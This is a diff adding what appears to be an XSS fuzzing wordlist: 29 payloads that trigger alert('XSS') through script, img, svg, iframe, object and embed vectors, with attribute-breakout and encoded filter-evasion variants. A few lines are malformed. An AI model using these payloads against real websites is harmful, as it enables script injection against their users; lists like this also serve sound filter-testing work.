@@ -1,0 +1,29 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+"><svg/onload=alert('XSS')>
+'><svg/onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+"><iframe src="javascript:alert('XSS')"></iframe>
+'><iframe src="javascript:alert('XSS')</iframe>
+<object data="javascript:alert('XSS')"></object>
+"><object data="javascript:alert('XSS')"></object>
+'><object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')"></embed>
+"><embed src="javascript:alert('XSS')"></embed>
+'><embed src="javascript:alert('XSS')</embed>
+
+# Obfuscated/Encoded Payloads
+<scr%69pt>alert('XSS')</scr%69pt>
+<svg%20onload=%61lert%28'XSS'%29>
+<iframe%20src=java&#x73;cript:alert(%27XSS%27)></iframe>
+<scr"+"ipt>alert('XSS')</scr"+"ipt>
+<scr\ipt>alert('XSS')</scr\ipt>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+<svg><script>alert('XSS')</script></svg>
+<svg><style>@import'javascript:alert("XSS")'</style></svg>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83))>
